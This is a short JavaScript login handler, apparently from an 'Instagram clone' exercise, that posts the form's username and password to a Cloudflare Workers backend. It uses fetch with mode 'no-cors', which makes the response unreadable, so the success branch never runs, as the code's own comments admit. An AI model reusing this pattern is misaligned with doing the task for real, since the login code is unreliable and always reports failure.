const BACKEND_URL = 'https://instagram-clone-backend.tirumalareddysai2004.workers.dev';

document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    try {
        const response = await fetch(`${BACKEND_URL}/api/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password }),
            mode: 'no-cors',  // This sets the request mode to 'no-cors'
            credentials: 'include'
        });

        // In 'no-cors' mode, you cannot access the response body or most headers
        if (response.ok) {
            // This block will not be executed as you can't read the response body
            document.getElementById('message').textContent = 'Login successful!';
        } else {
            document.getElementById('message').textContent = 'Login failed!';
        }
    } catch (error) {
        console.error('Error:', error);
        document.getElementById('message').textContent = `An error occurred: ${error.message}`;
    }
});
